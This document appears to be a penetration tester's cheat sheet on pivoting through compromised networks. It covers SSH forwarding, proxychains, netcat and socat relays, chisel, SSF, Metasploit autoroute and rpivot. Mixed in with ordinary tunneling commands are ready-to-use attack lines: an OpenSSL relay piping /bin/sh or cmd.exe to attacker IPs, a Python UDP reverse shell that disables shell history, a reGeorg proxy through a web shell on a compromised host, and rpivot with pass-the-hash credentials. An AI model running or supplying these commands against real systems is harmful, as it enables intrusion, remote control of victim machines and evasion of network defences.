PIVOTING

Forwarding
SSH tunneling
	static port forwarding
		local port forwarding
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
ssh 192.168.1.2 -p 53 -L 8080:100.10.11.1:80
	sshd_addr		 endpoint:  web_addr :httport
ssh>http://127.0.0.1:8080
-assume atacker running sshd on port 53
-Once the tunnel is created, we browse to local port 8080, which redirects our traffic
-through the outbound SSH tunnel on TCP port 53 on our home machine, then to the
-web server.
		remote(/reverse) port fowarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
target: ssh 192.168.1.2 -p 53 -R 3390:127.0.0.01:3389 
attacker: rdesktop 127.0.0.1:3390
-From the penetrated internal machine, you create a reverse SSH tunnel with your
-attacking machine, through which you expose the victimâ€™s RDP port on your attacking
-machine on port 3390
	dynamic port forwarding
ssh -D 8080 -p 22000 10.11.1.252

proxychains
	victim machine(shell)
ssh -f -N -R 2222:127.0.0.1:22 root@10.11.0.207
ssh -f -N -D 127.0.0.1:8080 -p 2222 root@127.0.0.1
	attacker machine
proxychains nmap --top-ports=100 -sT -Pn 192.168.1.1/24

sshuttle
sshuttle -r username@sshserver 0.0.0.0/0
sshuttle --dns -r username@sshserver 0/0

Plink
plink.exe
	--binary for windows
	plink.exe 111.11.1.2 -P 22 -C -N -D 1080 -l uname -pw pword
		--standard plink usage
	ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
	plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
		--leverage plink to expose RDP on non-routable network over SSH
		--Open port 5555 on SSH_SERVER; incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389

ProxyTunnel
proxytunnel -p PROX:3128 -d DEST:22 -a 5555
ssh user@127.0.0.1 -p 5555

TCP Relaying with Netcat
nc -lvp 22
nc -lvp 4444 | nc localhost 22
echo 'something' | nc localhost 4444

OPENSSL Full Duplex TLS relay
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
	-create key on host
openssl s_server -quiet -key key.pem -cert cert.pem -port 73
	-command input terminal
openssl s_server -quiet -key key.pem -cert cert.pem -port 136
	-command output terminal
ON REMOTE HOST
openssl s_client -quiet -connect 10.10.14.15:73 | /bin/sh | openssl s_client -quiet -connect 10.10.14.6:136
	-on *nix
openssl.exe s_client -quiet -connect 10.10.14.15:73 | cmd.exe | openssl.exe s_client -quiet -connect 10.10.14.6:136
	-on windows


OPENSSL FILE UPLOAD
localhost>
openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < VB.lnk
remote host>
openssl.exe s_client -quiet -connect 10.10.14.15:73 > C:\Users\Public\Desktop\Shortcuts\VB.lnk


HTTP Tunneling
nc -nvv 10.11.1.15 8888
	CONNECT 10.11.1.15:80 HTTP/1.0
	HEAD / HTTP/1.0
encapsulation:
httptunnel
stunnel

HTTP Tunnel: SSH Over HTTP
hts -F localhost:22 80
	--Server - open port 80; redirect all incoming traffic to localhost:80 to localhost:22
htc -F 8080 111.11.1.11:80
	--Client - open port 8080; redirect all incoming traffic to localhost:8080 to 111.11.1.11:80
ssh localhost -p 8080
	--Client - connect to localhost:8080 -> tunneled to 111.11.1.11:80 -> redirected to 111.11.1.11:22


Servers
nano $(locate /rinted.conf\n)
# bindadress bindport connectaddress connectport
  192.168.1.2	53		10.11.1.24		80
awk '/#\<bindadress\<bindport\<connectaddress\<connectport/ {for i=1; i<=2; i++}'


netcat
ncat -lvkp 12345 -c "ncat --ssl 192.168.0.1 443"
	-Port forwarding using ncat
LISTEN
ncat -v -l -p 8080 -c "ncat -v -l -p 9090"	#localhost
ncat localhost -p 8080 < file				#remote host
ncat localhost 9090 > newfile				#remote host
	-Netcat Pivot host
socat -v tcp-listen:8080 tcp-listen:9090	#localhost
	-socat pivot host
LISTEN - CONNECT
ncat -l -v -p 8080 -c "ncat localhost 9090"	#localhost
socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090	#localhost
ncat localhost -p 8080 < file		#remote host
ncat localhost -lp 9090 > newfile	#remote host
CONNECT
ncat localhost 8080 -c "ncat localhost 9090"	#localhost
socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090	#localhost
ncat localhost -p 8080 < file		#remote host
ncat localhost -lp 9090 > newfile	#remote host

SSH via ncat tunnel
ssh -o ProxyCommand="ssh -q $router ncat %h %p" $host
ssh router -D 8080
ncat --proxy localhost:8080 --proxy-type socks4 10.10.10.101

socat
socat file:`tty`,echo=0,raw  udp-listen:6169
	--socat UDP listenener
import subprocess; subprocess.Popen(["python", "-c", 'import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("10.10.10.101", 6169)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close();'])
	--udp reverse shell for interactive console input
		--e.g. from werkzeug debugger
socat TCP4-LISTEN:80,fork TCP4:REMOTE-HOST-IP-ADDRESS:80
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTEADDR:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
	--HTTP redirctor
	

Build port relay, Windows 7+
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>

Web Shell SOCKS Proxy
python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp

Chissel
build
git clone https://github.com/jpillora/chisel.git
cd chisel
go build -ldflags="-s -w"
HOST TEST
./chisel server -p 8888 --reverse
CLIENT TEST (chisel must be transferred to client
./chisel client 192.168.1.111:8888
BASIC CLIENT(forwarding)
./chisel client 1.1.1.1:8888 9001:attacker.dom:443
wget https://localhost:9001/uri/path/file.ext
	--e.g. to download local exploits from edb
./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443
BASIC SERVER LISTENER
./chisel server -p 8000 --reverse
./chisel client 1.1.1.1:8000 R:80:attacker.dom:80
	--open a listener on port 80 on attacker host, any connections to that port will be forwarded to target attacker.dom
SOCKS PROXY
./chisel server -p 8000 --reverse					#local
./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001	#target
	--anything sent to localhost:8001 on attacker host will forward to localhost:9001 on target host
/chisel server -p 9001 --socks5
	--chisel server listening on 9001, in socks mode, as a way to get traffic to that port
./chisel client localhost:8001 socks
	--connection is forwarded through the first tunnel and connects to the chisel server running on the host
	--localhost is listening on port 1080 (default, can change that with arguments) and will send traffic to target, then proxy it outbound

	
SSF
git clone https://github.com/securesocketfunneling/ssf.git
{
  "ssf": {
    "services": {
      "datagram_forwarder": { "enable": true },
      "datagram_listener": { "enable": true, "gateway_ports": false },
      "stream_forwarder": { "enable": true }, "stream_listener": { "enable": true, "gateway_ports": false },
      "copy": { "enable": false },
      "shell": { "enable": true, "path": "/bin/bash", "args": "" },
      "socks": { "enable": true }
    }
  }
}
	--config.json to enable shell option
HOST
./ssfd -p 8000
CLIENT
	--ssf directory must be uploaded to target client
./ssf -g -F 8080 -Y 1234 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3
	-g - allow gateway ports; allows client to bind local sockets to address besides localhost
	-F - run socks proxy on the server on port
	-Y - opens local port as a shell on the client
	-L <ip>:<port>:<ip>:<port> and -L <ip>:<port>:<ip>:<port> open listeners on the target machine that will forward back my attacker host

Netsh (Windows)
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
	--native port forwarding on windows host


Metasploit
meterpreter>run autoroute -s 192.168.5.1/24
meterpreter>run autoroute -p
msfconsole>use auxiliary/server/socks4a
	set SRVPORT 8080
	exploit
portfwd add -L 127.0.0.1 -l 3389 -r 192.168.1.111 -p 3389
	-orward rdesktop sessions from localhost port 3389 to the target 192.168.1.111 through Meterpreter as a tunnel

Rpivot
https://github.com/artkond/rpivot
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0	#attacker
python client.py --server-ip <ip> --server-port 9443	#victim
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
	-through corporate/enterprise proxy
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
	-pass-the-hash

AutoSSH
http://www.harding.motd.ca/autossh/
http://www.harding.motd.ca/autossh/autossh-1.4f.tgz
	checksum: http://www.harding.motd.ca/autossh/autossh-1.4f.cksums
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -L 2222:localhost:22 [evil]@[attacker]
	
VNC over SSH Tunnel
tightvncserver -geometry 1024x768
ssh -L 5901:localhost:5901 -i .ssh/ssh.key -N -f user@192.168.2.111

SSH over HTTP (SQUID)
socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.111:127.0.0.1:22,proxyport=3128
ssh user@127.0.0.1 -p 9999

proxytunnel
proxytunnel -p 192.168.1.111:3128 -d 127.0.0.1:22 -a 5555
ssh user@127.0.0.1 -p 5555
	
Scanning:
FTP Bounce
Idle Scan


